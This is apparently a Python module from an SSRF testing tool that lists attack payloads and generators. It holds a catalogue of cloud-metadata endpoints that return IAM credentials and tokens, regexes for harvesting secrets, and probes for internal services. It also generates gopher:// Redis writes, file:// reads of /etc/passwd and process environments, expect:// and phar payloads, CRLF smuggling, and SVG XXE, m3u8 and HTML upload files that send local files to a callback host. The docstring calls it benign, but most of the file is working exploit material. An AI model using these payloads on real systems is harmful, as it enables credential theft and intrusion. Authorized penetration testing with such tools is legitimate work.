"""
payloads.py — SSRF payload catalogs and generators.

Data-heavy but plain: the SSRF-prone parameter/header names to target, the full
cloud-metadata matrix (per compute service), the internal-service exploitation
catalog (what proves reachability for each), and generators for protocol payloads
(gopher/dict/file/...) and malicious upload files (SVG/PDF/...).

Everything here is BENIGN by design — the proofs are read-only markers and OOB
callbacks, never destructive actions.
"""

from __future__ import annotations

# --- HUNT list: SSRF-prone parameter names -------------------------------
SSRF_PARAM_NAMES = [
    "url", "uri", "dest", "destination", "redirect", "redirect_url", "redirect_uri",
    "return", "return_url", "returnurl", "next", "callback", "webhook", "feed", "host",
    "port", "to", "out", "view", "dir", "show", "file", "document", "image", "image_url",
    "imageurl", "img", "path", "src", "source", "target", "page", "data", "reference",
    "ref", "site", "html", "domain", "load", "fetch", "resource", "continue", "window",
    "link", "proxy", "open", "api", "geturl", "remote", "u", "q", "preview", "upload",
]

# --- Header injection vectors (each may be fetched server-side) ----------
SSRF_HEADER_VECTORS = [
    "Referer", "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Server",
    "True-Client-IP", "X-Real-IP", "X-Client-IP", "CF-Connecting-IP", "Forwarded",
    "X-Originating-IP", "Host",
    # (TLS SNI is also a vector for routing-based SSRF — handled at connect time.)
]

# --- Cloud-metadata matrix (provider, description, method, url, headers, sensitivity) ---
CLOUD_METADATA = [
    {"provider": "AWS EC2 IMDSv1", "desc": "IAM role credentials (no token needed)",
     "method": "GET", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "headers": {}, "creds_path": "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
     "sensitivity": "critical"},
    {"provider": "AWS EC2 user-data", "desc": "Init-script secrets",
     "method": "GET", "url": "http://169.254.169.254/latest/user-data", "headers": {},
     "sensitivity": "high"},
    {"provider": "AWS EC2 IMDSv2", "desc": "Token-protected creds (PUT token, then GET)",
     "method": "GET", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "headers": {"X-aws-ec2-metadata-token": "{token}"},
     "token": {"method": "PUT", "url": "http://169.254.169.254/latest/api/token",
               "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}},
     "sensitivity": "critical"},
    {"provider": "AWS ECS/Fargate", "desc": "Task role creds (GUID from env)",
     "method": "GET", "url": "http://169.254.170.2/v2/credentials/", "headers": {},
     "env_hint": "file:///proc/self/environ (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)",
     "sensitivity": "critical"},
    {"provider": "AWS EKS Pod Identity", "desc": "Pod identity creds",
     "method": "GET", "url": "http://169.254.170.23/v1/credentials", "headers": {},
     "sensitivity": "critical"},
    {"provider": "AWS Lambda", "desc": "Invocation event / stage variables",
     "method": "GET", "url": "http://localhost:9001/2018-06-01/runtime/invocation/next",
     "headers": {}, "sensitivity": "high"},
    {"provider": "Azure IMDS", "desc": "OAuth2 token (needs Metadata:true)",
     "method": "GET",
     "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     "headers": {"Metadata": "true"}, "sensitivity": "critical"},
    {"provider": "Azure instanceinfo", "desc": "Instance info (no header — header-less proof)",
     "method": "GET", "url": "http://169.254.169.254/metadata/v1/instanceinfo", "headers": {},
     "sensitivity": "medium"},
    {"provider": "GCP", "desc": "Service-account token (recursive)",
     "method": "GET",
     "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     "headers": {"Metadata-Flavor": "Google"}, "sensitivity": "critical"},
    {"provider": "OCI", "desc": "Instance principals",
     "method": "GET", "url": "http://169.254.169.254/opc/v2/instance/",
     "headers": {"Authorization": "Bearer Oracle"}, "sensitivity": "high"},
    {"provider": "DigitalOcean", "desc": "Droplet metadata",
     "method": "GET", "url": "http://169.254.169.254/metadata/v1/", "headers": {},
     "sensitivity": "medium"},
    {"provider": "Alibaba", "desc": "RAM role creds",
     "method": "GET", "url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
     "headers": {}, "sensitivity": "high"},
]

# Secrets to regex-scan for in heapdumps / responses (possession proof only).
SECRET_PATTERNS = [
    (r"AKIA[0-9A-Z]{16}", "AWS access key id"),
    (r"ASIA[0-9A-Z]{16}", "AWS STS key id"),
    (r"(?i)secret[_-]?access[_-]?key\s*[=:]\s*\S+", "AWS secret access key"),
    (r"(?i)password\s*[=:]\s*\S+", "password"),
    (r"jdbc:[a-z]+://\S+", "JDBC connection string"),
    (r"(?i)authorization:\s*basic\s+\S+", "Basic auth header"),
    (r"(?i)spring\.datasource\.\S+", "Spring datasource config"),
    (r"eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+", "JWT"),
]

# --- Internal-service catalog: what reachability proof looks like --------
INTERNAL_SERVICES = [
    {"name": "Spring Boot Actuator", "ports": [8080, 8443, 9099, 8081],
     "probes": ["/actuator", "/actuator/heapdump", "/actuator/env", "/actuator/gateway/routes",
                "/actuator/httptrace", "/actuator/mappings"],
     "marker": "_links", "note": "heapdump leaks creds; gateway routes -> CVE-2022-22947 RCE "
                                  "(benign proof + AUTO-CLEANUP of any created route)."},
    {"name": "Redis", "ports": [6379], "probes": ["INFO"], "marker": "redis_version",
     "note": "probe via dict:// or gopher://; read INFO (benign)."},
    {"name": "Docker API", "ports": [2375, 2376], "probes": ["/version", "/containers/json"],
     "marker": "ApiVersion", "note": "reachability proof only — no container creation."},
    {"name": "Kubelet", "ports": [10250, 10255], "probes": ["/pods", "/metrics"],
     "marker": "kind", "note": "reachability proof only."},
    {"name": "Elasticsearch", "ports": [9200], "probes": ["/", "/_cat/indices"],
     "marker": "cluster_name", "note": "read-only proof."},
    {"name": "Consul", "ports": [8500], "probes": ["/v1/agent/self"], "marker": "Config",
     "note": "read-only proof."},
    {"name": "Prometheus", "ports": [9090], "probes": ["/api/v1/status/config"],
     "marker": "status", "note": "read-only proof."},
]


# --- Protocol payload generators -----------------------------------------
def gopher_redis_set(host: str, port: int, key: str, value: str) -> str:
    """A benign gopher:// payload that SETs a Redis key (marker proof, not RCE)."""
    crlf = "%0d%0a"
    cmds = f"SET {key} {value}{crlf}QUIT{crlf}"
    return f"gopher://{host}:{port}/_{cmds}"


def dict_redis_info(host: str, port: int = 6379) -> str:
    return f"dict://{host}:{port}/INFO"


def file_read(path: str = "/proc/self/environ") -> str:
    return f"file://{path}"


PROTOCOL_PAYLOADS = {
    "gopher_redis": lambda cb: gopher_redis_set("127.0.0.1", 6379, "ssrf", cb),
    "dict_redis": lambda cb: dict_redis_info("127.0.0.1"),
    "file_environ": lambda cb: file_read("/proc/self/environ"),
    "file_passwd": lambda cb: file_read("/etc/passwd"),
    "ftp": lambda cb: f"ftp://{cb}/",
    "ldap": lambda cb: f"ldap://{cb}/",
    "tftp": lambda cb: f"tftp://{cb}/x",          # egress-fallback (UDP)
    "sftp": lambda cb: f"sftp://{cb}/",
    "phar": lambda cb: "phar:///tmp/x.phar",       # deserialization -> RCE (flag only)
    "expect": lambda cb: "expect://id",
    "data": lambda cb: "data://text/plain;base64,U1NSRg==",
    "netdoc": lambda cb: "netdoc:///etc/passwd",
}


def crlf_smuggle(host: str, port: int, smuggled: str) -> str:
    """CRLF-inject extra headers/requests into an outbound URL."""
    return f"http://{host}:{port}/%0d%0a{smuggled}"


# --- File-format payload generators (callback-confirmed) -----------------
def svg_xxe(callback_url: str) -> bytes:
    """SVG that references an external image -> server fetches your callback."""
    return (f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" '
            f'xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1">'
            f'<image xlink:href="{callback_url}" width="1" height="1"/></svg>').encode()


def svg_xxe_file(callback_url: str) -> bytes:
    """SVG with an XXE that exfiltrates a local file to your callback."""
    return (f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "{callback_url}">]>'
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>').encode()


def m3u8_ssrf(callback_url: str) -> bytes:
    """HLS playlist -> FFmpeg fetches the segment URL (SSRF / local file read)."""
    return (f"#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\n{callback_url}\n"
            f"#EXT-X-ENDLIST\n").encode()


def html_ssrf(callback_url: str) -> bytes:
    """HTML for a PDF/HTML renderer to fetch (renderer SSRF)."""
    return (f'<html><body><img src="{callback_url}">'
            f'<iframe src="{callback_url}"></iframe></body></html>').encode()


FILE_FORMAT_PAYLOADS = {
    "svg_image": ("image/svg+xml", "poc.svg", svg_xxe),
    "svg_xxe": ("image/svg+xml", "poc.svg", svg_xxe_file),
    "m3u8": ("application/vnd.apple.mpegurl", "poc.m3u8", m3u8_ssrf),
    "html": ("text/html", "poc.html", html_ssrf),
}
